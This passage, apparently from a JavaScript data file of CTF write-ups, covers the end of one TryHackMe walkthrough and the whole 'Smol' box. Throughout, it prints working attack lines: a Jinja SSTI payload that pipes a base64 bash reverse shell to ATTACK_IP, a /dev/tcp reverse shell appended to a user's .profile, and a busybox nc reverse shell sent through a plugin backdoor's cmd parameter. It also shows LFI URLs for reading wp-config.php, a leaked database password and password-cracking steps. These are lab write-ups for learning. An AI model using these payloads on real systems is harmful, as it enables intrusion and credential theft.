<span class="tok-keyword">{{config</span>.__class__.__init__.__globals__[<span class="tok-string">"os"</span>].popen(<span class="tok-string">"echo &lt;BASE64&gt; | base64 -d | bash"</span>).read()<span class="tok-keyword">}}</span>

<span class="tok-comment"># BASE64 = base64 of:  bash -i &gt;&amp; /dev/tcp/ATTACK_IP/4444 0&gt;&amp;1</span>
<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>
<span class="tok-comment"># &gt; shell as ayham</span>
<span class="tok-func">find</span> / -name <span class="tok-string">'flag1.txt'</span>
THM<span class="tok-string">{LFI_1s_Pr33Ty_Aw3s0Me_1337}</span></code></pre>

<h3>5 · ayham → F30s (.profile side-load)</h3>
<p>In the crontab, a job boots the shell of user <code>F30s</code> — sourcing <code>~/.profile</code> on the way in. We can't write the checked script, but we can write <code>F30s</code>'s profile.</p>
<pre><code><span class="tok-func">cat</span> /etc/crontab   <span class="tok-comment"># spot the F30s and site_check jobs</span>
<span class="tok-func">echo</span> <span class="tok-string">'bash -i &gt;&amp; /dev/tcp/ATTACK_IP/5555 0&gt;&amp;1'</span> &gt;&gt; /home/F30s/.profile
<span class="tok-comment"># wait → shell as F30s</span></code></pre>

<h3>6 · F30s → root (curl -K file read)</h3>
<p>A root cron runs <code>curl -K /home/F30s/site_check</code>. curl's config file supports <code>url</code> and <code>output</code> keys — so we turn the "site checker" into a <code>file://</code> reader that copies protected files with root rights.</p>
<pre><code><span class="tok-comment"># Rewrite the config, wait for the cron</span>
url = <span class="tok-string">file:///root/flag2.txt</span>
output = <span class="tok-string">/home/F30s/enc_flag2.txt</span>
<span class="tok-comment"># &gt; flag2 lands — still XOR-encrypted</span>

<span class="tok-comment"># Also pull /secret.txt and /secret-tip.txt</span>
<span class="tok-comment"># secret-tip.txt: "it's allways about root" → the XOR key word</span>
<span class="tok-comment"># XOR secret.txt bytes with "root" → key</span>
Key = <span class="tok-num">110920001386</span>
<span class="tok-comment"># XOR enc_flag2 with the key (brute final digits 00–99)</span>
THM<span class="tok-string">{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}</span></code></pre>
<p>The last two digits of the key were unknown — <code>1109200013XX</code> — so test 00–99 to fully decrypt flag2.</p>

<h3>7 · Retrospective</h3>
<p>Attack chain: extension-filter null-byte → XOR password recovery → Jinja SSTI → <code>.profile</code> side-load → <code>curl -K</code> file read → XOR flag decode. Lessons: web filters hide nothing, never feed user input to <code>render_template_string</code>, and root cron running curl with a user-writable config file is root file-read.</p>`
  },

  'smol': {
    title: 'Smol — WP Plugin SSRF to sudo Bash',
    meta: { diff: 'medium', platform: 'thm', time: '20 min' },
    content: `
<h2>Smol — WordPress Plugin SSRF to sudo Bash</h2>
<p>A WordPress site with a legacy plugin full of CVEs, a poisoned Hello-Dolly backdoor, and a chain of password reuse that ends at a full-sudo user. Goal: user + root flags.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-comment"># The site redirects to a subdomain</span>
<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x smol.thm www.smol.thm</span>" &gt;&gt; /etc/hosts

<span class="tok-func">nmap</span> -sC -sV www.smol.thm
22/tcp open  ssh   OpenSSH 8.2p1
80/tcp open  http  Apache 2.4.41 (WordPress 6)

<span class="tok-func">wpscan</span> --url http://www.smol.thm --enumerate u,vp
<span class="tok-comment"># users: admin think wp diego gege xavi</span>
<span class="tok-comment"># plugin jsmol2wp 1.07 → CVE-2018-20462 XSS, CVE-2018-20463 SSRF/LFI</span></code></pre>

<h3>2 · LFI Through the Plugin</h3>
<p>jsmol2wp's <code>query</code> param reads files via <code>php://filter</code>. Grab <code>wp-config.php</code> to win the web + DB credentials.</p>
<pre><code><span class="tok-func">curl</span> "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-config.php"
<span class="tok-comment"># &gt; wp-admin login / DB creds:  wpuser : kbLSF2Vop#lw3rjDZ629*Z%G</span></code></pre>

<h3>3 · Backdoored Hello Dolly</h3>
<p>A private post says to verify the "Hello Dolly" plugin source — this site's copy was tampered with. Read it through the LFI and decode to find a hidden <code>cmd</code> parameter backdoor. Result: unauthenticated RCE.</p>
<pre><code><span class="tok-comment"># base64-encode read so PHP doesn't execute the file</span>
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/convert.base64-encode/resource=../hello.php

<span class="tok-comment"># decode → backdoor exposes a "cmd" parameter</span>
http://www.smol.thm/wp-admin/index.php?cmd=<span class="tok-func">id</span>
<span class="tok-comment"># &gt; uid=33(www-data) — RCE confirmed</span></code></pre>

<h3>4 · Reverse Shell + DB Dump</h3>
<pre><code><span class="tok-comment"># busybox nc keeps the payload short</span>
http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%20ATTACK_IP%20443%20-e%20sh
<span class="tok-func">nc</span> -lvnp <span class="tok-num">443</span>
<span class="tok-comment"># &gt; shell as www-data</span>

<span class="tok-comment"># Reuse DB creds → dump wp_users → john + rockyou</span>
<span class="tok-func">mysql</span> -u wpuser -p... wordpress -e <span class="tok-string">"SELECT user_login,user_pass FROM wp_users"</span>
<span class="tok-func">john</span> hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
<span class="tok-comment"># &gt; diego : &lt;cracked&gt; — the @local account</span>
<span class="tok-func">su</span> diego
<span class="tok-func">find</span> / -name <span class="tok-string">'user.txt'</span>
<span class="tok-comment"># &gt; user flag</span></code></pre>

<h3>5 · diego → think (stolen SSH key)</h3>
<p>Keep enumerating — another user's private key is world-readable. Grab <code>think</code>'s <code>id_rsa</code> and SSH in; think belongs to the <code>dev</code> and <code>internal</code> groups.</p>
<pre><code><span class="tok-func">cat</span> /home/think/.ssh/id_rsa
<span class="tok-func">chmod</span> <span class="tok-num">600</span> id_rsa
<span class="tok-func">ssh</span> -i id_rsa think@smol.thm
<span class="tok-comment"># think → groups: think, dev, internal</span></code></pre>

<h3>6 · think → xavi (old zip + wp-config)</h3>
<p>think's home contains <code>wordpress.old.zip</code>, password-protected. Crack it, unzip, and read the old <code>wp-config.php</code> — it leaks xavi's credentials.</p>
<pre><code><span class="tok-func">zip2john</span> wordpress.old.zip &gt; zip.hash
<span class="tok-func">john</span> zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
<span class="tok-func">unzip</span> wordpress.old.zip
<span class="tok-func">cat</span> wordpress.old/wp-config.php
<span class="tok-comment"># &gt; xavi's password in the DB constants</span>
<span class="tok-func">su</span> xavi</code></pre>

<h3>7 · xavi → root</h3>
<pre><code><span class="tok-func">sudo</span> -l
(user xavi) (ALL : ALL) ALL
<span class="tok-func">sudo</span> su
root@smol:~# <span class="tok-func">cat</span> /root/root.txt
<span class="tok-comment"># root flag</span></code></pre>

<h3>8 · Retrospective</h3>
<p>Attack chain: plugin LFI → wp-config creds → poisoned-plugin RCE → hash crack → SSH key theft → old-zip cred leak → full sudo. Lessons: drop stale plugins, review third-party code, and DB/SSH/zip password reuse makes the box one long sudo.</p>`
  }
};